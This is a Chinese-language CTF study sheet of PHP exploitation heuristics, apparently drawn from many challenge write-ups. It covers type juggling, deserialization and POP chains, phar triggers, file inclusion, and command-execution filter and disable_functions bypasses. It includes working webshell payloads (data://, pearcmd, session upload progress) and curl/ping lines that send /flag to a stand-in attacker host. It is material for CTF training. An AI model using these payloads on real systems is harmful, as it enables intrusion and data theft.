---
title: PHP 系漏洞判据库（从 147 篇 WP 抽象）
phase: webapp
vuln_class: [php, type-juggling, deserialization, lfi, rce]
summary: 把 PHP 相关 WP 的可迁移判据压成一张表：先判「版本/配置/入口」三件事，再按「弱类型→反序列化→文件包含→命令执行」四条主线选路。每条判据都带反例分支，避免无脑套模板。 PHP 弱类型怎么绕、反序列化链怎么找、文件包含怎么读源码、命令执行被过滤、disable_functions 绕过、phar 触发点、POP 链怎么接。
---

# PHP 系漏洞判据库

> 来源：147 篇涉及 PHP 的赛题 WP 提炼，抽 638 条观测 + 403 条失败尝试，
> 去掉「某题某 flag」的题目细节，只留**换一题仍然成立**的判据。
> 用法：先看 §0 找自己遇到的现象，再跳对应节。不要从第一条读到最后一条。

## 0. 判据速查

| 现象 | 判据（说明什么） | 去哪节 |
|---|---|---|
| 源码里 `==` 比较、`md5()`/`sha1()` 参与判断 | 弱类型可绕，优先试 magic hash 与数组/整数混淆 | §1 |
| `strcmp`/`in_array`/`array_search` 的返回值被 `if(!...)` 用 | 传数组让函数返回 `NULL`，`!NULL` 为真 | §1.2 |
| `preg_match` 白名单 `/^[0-9a-f]+$/` 但后面又做数字比较 | 十六进制字面量 / 下划线数字 / `%09` 旁路 | §1.3 |
| 有 `unserialize()`，但目标类里没有直接可用的危险方法 | 找魔术方法接力（`__destruct`→`__toString`→`__invoke`→`__call`） | §2.1 |
| 只给 `file_exists`/`file_get_contents`/`getimagesize`，没有 `unserialize` | `phar://` 也能触发反序列化 | §2.3 |
| 能包含文件但读不到 PHP 源码 | `php://filter` + `convert.base64-encode` | §3.1 |
| `file`/`http`/`php` 关键字全被过滤 | `php://filter` 的 `resource=` 可被 iconv 链改造，或换 `glob://`/`data://` | §3.2 |
| 能写文件但 `disable_functions` 挡了 `system` | 换 LD_PRELOAD、`putenv`、`mail()`、`imap_open` | §4.2 |
| 能执行命令但 `cat`/`flag`/空格被过滤 | `${IFS}`、`sort%09`、通配符、`tac`、`$IFS$9` | §4.1 |
| 反序列化入口存在但 `__wakeup` 把值重置了 | 属性个数 `O:1:"A":2:` 让 `__wakeup` 跳过 | §2.2 |
| 有 `session.upload_progress` 且能包含 `/tmp` | session 文件内容可控 → LFI to RCE | §3.3 |
| 拿到源码但不知道从哪读起 | 先找 `unserialize`/`include`/`eval`/`call_user_func` 四类 sink | §5 |

## 1. 弱类型与类型混淆

**判据**：比较运算用 `==` 而不是 `===`，或函数在异常输入下返回 `NULL`/`false` 而不是抛错。

### 1.1 magic hash

`"0e"` 开头的字符串在 `==` 下都被当成科学计数法的 0。

```text
md5("240610708") = 0e462097431906509019562988736854
md5("QNKCDZO")   = 0e830400451993494058024219903391
md5("aabg7XSs")  = 0e087386482136013740957780965295
```

判据是**两个都是 `0e` 开头**，只有一个 `0e` 不行（`0e123 == "abc"` 在 PHP 8 已不成立）。

### 1.2 传数组让函数失效

`strcmp(array, string)` 返回 `NULL`，`if(!strcmp(...))` 直接放行。

```bash
# 原本 password[]=x 会被当成数组
curl http://target/login -d 'password[]=anything'
```

同一招对 `in_array`、`array_search`、`md5`、`sha1`、`strpos` 都成立——它们收到数组时返回 `NULL`/`false`，而不是报错。判据是**调用点没有 `is_string()` 前置检查**。

### 1.3 数字白名单的旁路

| 过滤 | 绕过 | 为什么 |
|---|---|---|
| `is_numeric($x) && $x == 289114` | 传 `289114abc`（PHP 7） | `is_numeric` 认前导数字，`==` 也认 |
| `/^[0-9]+$/` 后转 int | 传 `1_11`（PHP 7.4+） | 下划线是数字字面量分隔符，等价 `111` |
| `preg_match('/^\d+$/')` 但用 `%09` 开头 | 传 `%09123` | `\d` 不匹配 tab 但 `(int)` 会跳过空白 |
| `intval($x) > 0` 且要绕过长度 | 传 `0x10` | `intval` 默认 base 10，但 `==` 比较会走数字转换 |

**坑**：`is_numeric("289114abc")` 在 PHP 8 返回 `false`，PHP 7 返回 `true`。先确认版本。

### 1.4 字符构造类

`0/0` 在 PHP 8 抛 `DivisionByZeroError`，PHP 7 返回 `NAN`。全角字符（`０`、`１`）在 `intval` 下是 0，但字符串比较时非空。

## 2. 反序列化

**判据**：出现 `unserialize()`，或出现能间接触发它的函数（`phar://`、`session`、`SoapClient`）。

### 2.1 POP 链的构造顺序

不要背链，按**魔术方法的接力顺序**找：

```text
__destruct / __wakeup  → 入口（对象销毁或反序列化时自动跑）
   ↓ 调用了某个属性
__toString              → 对象被当字符串用时跑
   ↓ 返回了某个属性
__invoke                → 对象被当函数调用时跑
   ↓ 调用了某个方法
__call / __get          → 方法/属性不存在时跑
```

判据是**上一环的返回值能喂给下一环的触发点**。找不到接力就说明这条链断了，换入口，不要硬凑。

典型四层模板：

```php
// A::__destruct → echo $this->a;        触发 B::__toString
// B::__toString → return $this->b->show(); 触发 C::__call
// C::__call     → ($this->cmd)($this->arg); 触发 D::__invoke
// D::__invoke   → system($this->x);
```

### 2.2 绕 `__wakeup`

`__wakeup` 在属性数不匹配时**不执行**（PHP < 7.4.28 的行为；高版本已修）。

```text
正常:  O:1:"A":1:{s:1:"x";s:3:"yes";}
绕过:  O:1:"A":2:{s:1:"x";s:3:"yes";}   ← 声明 2 个属性但只给 1 个
```

判据是**目标 PHP 版本 < 7.4.28**。高版本改用 `C:` 前缀触发 `__unserialize`（如果类实现了 `Serializable`）。

### 2.3 `phar://` 触发面

不只有 `file_get_contents`。以下函数只要参数以 `phar://` 开头就会触发反序列化：

```text
file_exists  file_get_contents  file_put_contents  fopen  unlink
stat  getimagesize  exif_read_data  finfo_file  md5_file
is_file  is_dir  copy  rename  scandir
```

判据是**存在上述任一函数且路径参数可控**。`phar` 文件本身要能上传，改后缀为 `.png`/`.jpg` 不影响（`phar` 只认文件内容里的 stub）。

**坑**：`phar://` 在 PHP 8 需要 `phar.readonly=0` 才能**生成**，但**读取**不受限。

### 2.4 反序列化的替代入口

| 入口 | 触发条件 |
|---|---|
| `session` 文件 | `session.upload_progress.enabled=On`，文件名含 `\|` 后接序列化串 |
| `SoapClient` | `_user_agent` 等属性可注入 CRLF，构造 SSRF |
| `PDO` pgsql | `pgsqlCopyFromFile`、`dsn_from_uri` 会走 `phar` 解析 |
| `SimpleXMLElement` | 老版本 XXE 可读文件后触发 |

## 3. 文件包含与读取

**判据**：出现 `include`/`require`/`file_get_contents`/`readfile`，且参数部分可控。

### 3.1 读源码的标准姿势

```bash
# 读 index.php 源码
?file=php://filter/convert.base64-encode/resource=index.php

# 过滤了 resource 关键字时，用多重过滤器
?file=php://filter/read=convert.base64-encode/resource=index.php
```

判据是**能包含但看不到 `<?php`**——说明被 PHP 执行了，不是没读到。

### 3.2 过滤了 `php://` 怎么办

| 过滤 | 绕过 |
|---|---|
| 黑名单含 `php` | `php://` 大小写变体无效（协议名大小写敏感）；改用 `glob://` 列目录 + `data://` 执行 |
| 黑名单含 `file` | `php://filter` 不含 `file` 字样，可直接用 |
| 黑名单含 `http` | `data://text/plain;base64,...` 不需要出网 |
| 过滤 `_`（下划线） | iconv 链：`convert.iconv.UTF8.CSISO2022KR` 之类，逐个字符试 |
| 只允许 `include` 且要 RCE | `data://text/plain,<?php system($_GET[c]);?>`（需 `allow_url_include=On`） |

**坑**：`data://` 少写两个斜杠（`data:text/plain,...`）在很多版本仍可用，但 `allow_url_include` 必须开。

### 3.3 `session.upload_progress` 打 LFI

前置条件三件套：

```ini
session.upload_progress.enabled = On     # 默认 On
session.upload_progress.cleanup = On     # 默认 On，会删文件
session.save_path = /tmp                 # 默认
```

判据是**能包含 `/tmp/sess_<PHPSESSID>`**。`cleanup=On` 时文件存活时间极短，要用 1MB padding 撑住，或并发抢读。

```python
# 关键：文件名里的 PHP_SESSION_UPLOAD_PROGRESS 值可控
files = {'file': ('a'*1024*1024, 'x')}
data = {'PHP_SESSION_UPLOAD_PROGRESS': '<?php system($_GET[c]);?>'}
# 同时并发请求 ?file=/tmp/sess_<sid>&c=id
```

### 3.4 `pearcmd` 打 LFI

`/usr/local/lib/php/pearcmd.php` 存在时（Docker 官方 PHP 镜像默认有）：

```bash
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_POST[1])?>+/tmp/shell.php
```

判据是**能包含 pearcmd.php 且 `register_argc_argv=On`**。

## 4. 命令执行

**判据**：有 `system`/`exec`/`shell_exec`/`passthru`/`popen`/`proc_open`/反引号，或 `preg_replace` 带 `/e`（PHP < 7）。

### 4.1 过滤绕过

| 被过滤 | 绕过 |
|---|---|
| 空格 | `${IFS}`、`$IFS$9`、`%09`、`<`、`{cat,flag}` |
| `cat` | `tac`、`sort`、`nl`、`more`、`less`、`head`、`od`、`xxd`、`base64` |
| `flag` | `fl*`、`fla?`、`/f*`、`$IFS` 拼接 |
| `/` | `${PATH:0:1}`、`$(printf "\57")` |
| 关键字全拦 | 变量拼接 `a=fl;b=ag;$a$b`、`$(rev<<<galf)` |
| 长度限制（12 字符） | `sort%09*` 读当前目录全部文件 |
| 无回显 | 写文件到 web 目录、DNS 外带、`curl` 回连 |

```bash
# 无回显时的三种外带
curl http://attacker/$(cat /flag | base64 -w0)
ping -c1 `cat /flag | base64 -w0`.attacker.com
cat /flag > /var/www/html/out.txt
```

### 4.2 `disable_functions` 绕过

| 手法 | 前置条件 |
|---|---|
| LD_PRELOAD + `putenv` | `putenv` 未被禁，能写 `.so` |
| `mail()` 第 5 参数 | `mail` 未禁，sendmail 存在 |
| `imap_open` | `imap` 扩展在 |
| `error_log` 写文件 | `error_log` 未禁 |
| `FastCGI` 打 php-fpm | 能连 9000 端口 |
| `Apache mod_cgi` | 能写 `.htaccess` |

**坑**：`disable_functions` 只禁**函数调用**，不禁**语言结构**。`include`、`echo`、反引号、`${}` 都不受影响。

### 4.3 无参数 RCE

```php
// 源码形如 eval($_GET['code']) 且无参数可用
// 用 getallheaders() / get_defined_vars() 取到自己发的 header
?code=system(end(getallheaders()));
// 配合 Header: cmd: id
```

判据是**能调函数但不能传参**。`scandir(current(localeconv()))` 是读当前目录的老招。

## 5. 源码审计的入口顺序

拿到源码不要从头读，按 sink 反查：

```text
1. grep 'unserialize\|eval\|assert\|create_function'   → 代码执行
2. grep 'include\|require'                             → 文件包含
3. grep 'system\|exec\|shell_exec\|passthru\|`'        → 命令执行
4. grep 'file_get_contents\|fopen\|readfile'           → 任意读
5. grep '\$_(GET|POST|REQUEST|COOKIE)'                 → 找参数入口
6. 从 sink 往上追参数，看有没有过滤
```

判据是**sink 到 source 之间有没有过滤**。有过滤就看过滤能不能绕（§4.1），没过滤直接打。

**坑**：`$_REQUEST` 受 `request_order` 影响，`GPC` 顺序决定同名参数谁覆盖谁，这个顺序本身可以是绕过点。

## 6. 纪律

- **先确认 PHP 版本**。`==` 的行为、`__wakeup` 绕过、`0/0`、`is_numeric` 全都在 7 和 8 之间变过。版本不明时所有弱类型判据都不可靠。
- **先确认 `php.ini` 的三个开关**：`allow_url_include`、`disable_functions`、`open_basedir`。这三个决定一半手法能不能用。
- **不要背 POP 链**。链是跟着目标代码走的，背下来的链换个类名就废。要背的是「魔术方法接力顺序」。
- **`phar://` 先确认能上传**。不能上传就别在这条路上耗。
- **无回显优先想外带，不要死磕回显**。写文件、DNS、HTTP 回连三条路任选。
- **`disable_functions` 绕不过就换思路**。绕它成本很高，往往不如找一个没被禁的 sink。
- **题目给了源码就先审计，不要先黑盒**。PHP 题的源码通常直接给出，黑盒猜参数是浪费时间。
